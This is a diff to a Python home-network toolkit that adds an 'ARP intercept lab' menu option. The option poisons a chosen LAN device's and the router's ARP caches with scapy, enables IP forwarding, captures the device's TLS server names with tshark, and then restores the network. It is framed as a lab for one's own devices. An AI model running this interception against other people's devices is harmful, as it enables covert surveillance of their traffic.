@@ -21,7 +21,12 @@ import shutil
 import socket
 import subprocess
 import sys
+import threading
 import time
+
+# scapy is needed ONLY for the ARP intercept lab (menu option 5). It is
+# imported lazily inside that function, so the rest of this stdlib-only
+# toolkit works without it.  Install with:  pip install scapy
 
 IS_WIN = platform.system() == "Windows"
 HOME = os.path.expanduser("~")
@@ -363,7 +368,134 @@ def step_remote(net):
 
 
 # ----------------------------------------------------------------------
-# STEP 5 - Watch for devices joining / leaving
+# STEP 5 - ARP man-in-the-middle LAB   (YOUR OWN network & devices ONLY)
+# ----------------------------------------------------------------------
+# Intercepts ONE device's traffic via ARP spoofing so you can see which
+# servers it connects to (TLS SNI). This is a real interception technique
+# - only run it against devices you own on a network you own. It enables
+# IP forwarding so the target keeps internet, and RESTORES every change
+# (both ARP tables + forwarding) when it stops.
+
+def _fwd_alias():
+    """InterfaceAlias of the interface that holds the default route."""
+    ps = ("Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway} | "
+          "Select-Object -First 1 -ExpandProperty InterfaceAlias")
+    try:
+        return subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                              capture_output=True, text=True).stdout.strip() or "Wi-Fi"
+    except Exception:
+        return "Wi-Fi"
+
+
+def _set_forwarding(alias, state):
+    if IS_WIN:
+        subprocess.run(["powershell", "-NoProfile", "-Command",
+                        f"Set-NetIPInterface -InterfaceAlias '{alias}' -Forwarding {state}"],
+                       capture_output=True, text=True)
+
+
+def step_arp(net):
+    print("\n[Step 5] ARP MAN-IN-THE-MIDDLE LAB  (YOUR OWN devices only)")
+    print("""Spoofs ONE device so its traffic flows through this PC, then shows
+which servers it connects to (TLS SNI). Use ONLY on your own network
+and your own devices. Everything is restored when it stops.""")
+
+    target = input("\nTarget device IP (e.g. your phone): ").strip()
+    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
+        print("  Not a valid IP."); return
+    if not target.startswith(net["prefix"]):
+        print(f"  {target} is not on your network ({net['prefix']}0/24). Aborting."); return
+    if target in (net["ip"], net["gateway"]):
+        print("  Refusing to target this PC or the router."); return
+
+    try:
+        from scapy.all import ARP, Ether, srp, sendp, conf
+    except ImportError:
+        print("  Needs scapy:  pip install scapy"); return
+
+    gw = net["gateway"]
+    try:
+        conf.iface = conf.route.route(target)[0]     # use the iface that reaches the LAN
+    except Exception:
+        pass
+
+    def mac_of(ip):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                     timeout=2, retry=2, verbose=0)
+        return ans[0][1].hwsrc if ans else None
+
+    print("\nResolving MAC addresses ...")
+    try:
+        t_mac, g_mac = mac_of(target), mac_of(gw)
+    except Exception as e:
+        print(f"  Packet access failed: {e}")
+        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
+    if not t_mac or not g_mac:
+        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac}).")
+        print("  Make sure the device is awake and on this network."); return
+    print(f"  target  {target:<15} = {t_mac}")
+    print(f"  gateway {gw:<15} = {g_mac}")
+
+    alias = _fwd_alias()
+    print(f"\nEnabling IP forwarding on '{alias}' (keeps {target} online)...")
+    _set_forwarding(alias, "Enabled")
+
+    stop = threading.Event()
+
+    def poison():
+        # tell target WE are the gateway, and tell gateway WE are the target
+        pkt_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
+        pkt_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
+        while not stop.is_set():
+            sendp(pkt_t, verbose=0)
+            sendp(pkt_g, verbose=0)
+            stop.wait(2)
+
+    th = threading.Thread(target=poison, daemon=True)
+    th.start()
+    print("Spoofing active. Capturing the target's HTTPS server names for 20s...")
+    print("(make sure the device is doing something - e.g. a video playing)\n")
+
+    tshark = find_tshark()
+    iface = wifi_interface(tshark) if tshark else None
+    try:
+        if not (tshark and iface):
+            print("  tshark/Wi-Fi interface not found - cannot show SNI.")
+            return
+        print(f"  {'SERVER (SNI)':<40}DEST IP")
+        print("  " + "-" * 56)
+        cap = subprocess.run(
+            [tshark, "-i", iface, "-a", "duration:20", "-n",
+             "-Y", f"tls.handshake.type==1 && ip.src=={target}",
+             "-T", "fields", "-e", "tls.handshake.extensions_server_name",
+             "-e", "ip.dst"],
+            capture_output=True, text=True).stdout
+        seen = []
+        for line in cap.splitlines():
+            parts = line.split("\t")
+            if len(parts) == 2 and parts[0] and parts[0] not in [s[0] for s in seen]:
+                seen.append((parts[0], parts[1]))
+        if seen:
+            for sni, dst in seen:
+                print(f"  {sni:<40}{dst}")
+        else:
+            print("  (no HTTPS server names seen - is the device active?)")
+    finally:
+        print("\nStopping spoof and RESTORING the network ...")
+        stop.set()
+        th.join(timeout=3)
+        # send the CORRECT mappings back to both sides, several times
+        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
+        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
+        for _ in range(5):
+            sendp(fix_t, verbose=0)
+            sendp(fix_g, verbose=0)
+        _set_forwarding(alias, "Disabled")
+        print("  ARP tables restored, IP forwarding disabled. Done.")
+
+
+# ----------------------------------------------------------------------
+# JSON baseline helpers (used by the auto report)
 # ----------------------------------------------------------------------
 def _load_json(path):
     try:
@@ -389,6 +521,7 @@ MENU = """
   2) Port scan a device (nmap, or built-in fallback)
   3) Read traffic (Wireshark)
   4) Remote access helpers
+  5) ARP intercept lab  (your own devices only)
   q) Quit
 """
 
@@ -512,7 +645,7 @@ def run_menu(net):
     print("======================================================")
     actions = {
         "1": step_discover, "2": step_portscan, "3": step_traffic,
-        "4": step_remote,
+        "4": step_remote, "5": step_arp,
     }
     while True:
         print(MENU)
@@ -526,7 +659,7 @@ def run_menu(net):
             except Exception as e:
                 print(f"Error: {e}")
         else:
-            print("Pick 1-4 or q.")
+            print("Pick 1-5 or q.")
 
 
 def main():
